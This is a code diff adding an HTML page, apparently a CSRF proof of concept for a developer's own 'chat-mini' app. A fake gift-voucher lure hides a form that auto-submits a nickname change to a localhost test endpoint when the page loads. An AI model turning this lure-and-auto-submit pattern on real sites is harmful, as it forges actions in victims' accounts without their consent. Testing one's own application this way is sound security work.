@@ -1,0 +1,23 @@
+<!-- attacker.html -->
+<html>
+<head>
+    <title>무료 기프티콘 이벤트!</title>
+</head>
+<body>
+    <h1>이벤트에 참여해주셔서 감사합니다!</h1>
+    <p>버튼을 누르지 않아도 자동으로 응모됩니다...</p>
+
+    <!-- 보이지 않는 form이 chat-mini 서버로 자동 제출됩니다. -->
+    <form id="csrf-form" action="http://localhost:8081/api/users/user/update-nickname-csrf-test" method="POST" style="display:none;">
+        <input type="hidden" name="newNickname" value="Hacked!" />
+    </form>
+
+    <script>
+        // 페이지가 로드되면 즉시 form을 제출합니다.
+        window.onload = function() {
+            console.log("CSRF 공격 시도: 폼을 자동으로 제출합니다.");
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+</body>
+</html>
